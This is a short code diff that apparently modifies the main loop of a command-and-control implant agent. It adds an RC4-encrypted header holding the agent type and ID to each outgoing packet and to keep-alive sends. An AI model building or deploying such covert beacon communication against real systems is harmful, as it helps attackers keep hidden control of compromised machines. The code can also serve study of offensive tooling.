@@ -281,14 +281,31 @@ void AgentMain()
 			if (packerOut->datasize() > 4) {
 				packerOut->Set32(0, packerOut->datasize());
 
+				// Encrypt payload
 				EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);
 
-				g_Connector->SendData(packerOut->data(), packerOut->datasize());
+                // Prepend Header (Type + ID) encrypted
+                // Header is 8 bytes.
+                BYTE header[8];
+                *(DWORD*)header = g_Agent->config->agent_type;
+                *(DWORD*)(header + 4) = g_Agent->info->agent_id;
+                EncryptRC4(header, 8, g_Agent->SessionKey, 16);
+
+                // Construct full packet
+                DWORD fullSize = 8 + packerOut->datasize();
+                BYTE* fullPacket = (BYTE*)g_Connector->functions->LocalAlloc(LPTR, fullSize);
+                memcpy(fullPacket, header, 8);
+                memcpy(fullPacket + 8, packerOut->data(), packerOut->datasize());
+
+				g_Connector->SendData(fullPacket, fullSize);
+                
+                g_Connector->functions->LocalFree(fullPacket);
 
 				packerOut->Clear(TRUE);
 				packerOut->Pack32(0);
 			}
 			else {
+                // KeepAlive / Null packet
 				g_Connector->SendData(NULL, 0);
 			}
 		}
@@ -300,7 +317,19 @@ void AgentMain()
 
 			EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);
 
-			g_Connector->SendData(packerOut->data(), packerOut->datasize());
+            // Prepend Header
+            BYTE header[8];
+            *(DWORD*)header = g_Agent->config->agent_type;
+            *(DWORD*)(header + 4) = g_Agent->info->agent_id;
+            EncryptRC4(header, 8, g_Agent->SessionKey, 16);
+            
+            DWORD fullSize = 8 + packerOut->datasize();
+            BYTE* fullPacket = (BYTE*)g_Connector->functions->LocalAlloc(LPTR, fullSize);
+            memcpy(fullPacket, header, 8);
+            memcpy(fullPacket + 8, packerOut->data(), packerOut->datasize());
+
+			g_Connector->SendData(fullPacket, fullSize);
+            g_Connector->functions->LocalFree(fullPacket);
 			packerOut->Clear(TRUE);
 		}
 
